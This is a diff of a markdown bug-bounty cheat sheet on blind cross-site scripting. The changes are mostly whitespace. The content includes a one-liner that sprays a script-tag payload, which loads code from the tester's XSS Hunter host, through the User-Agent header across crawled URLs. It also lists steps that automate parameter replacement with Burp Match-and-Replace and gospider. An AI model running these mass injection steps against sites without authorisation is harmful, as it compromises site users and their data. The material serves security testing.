@@ -92,12 +92,17 @@ cat roots.txt | waybackurls | httpx -H "User-Agent: \"><script src=$YOUR_XSS_HUN
 #And monitor your xss hunter dashboard  
 ```
 **Automate Blind-XSS**
-**Match-& Replace burp suite option will use here Either you can use as automation with command line tool- **
+
+**Match-& Replace burp suite option will use here Either you can use as automation with command line tool-**
 
 1 - [Clne this tool](https://github.com/Leoid/MatchandReplace)
+
 2- python generate.py -f parameters.txt -c "Blind-XSS" --rule "request_param_name" --replace https://abdulrahman2x.xxt  -x -o blind-xss.json
+
 3- After getting your blind-xss output then add into your burp - IN Match & Replace section
+
 4- Now after set parameter in burp then we need send urls to out burp to check blind xss. 
+
 5- gospider -S hosts.txt -a -w --sitemap -r -d 8 -p http://127.0.0.1:8080 
 
 **Same as SSRF**
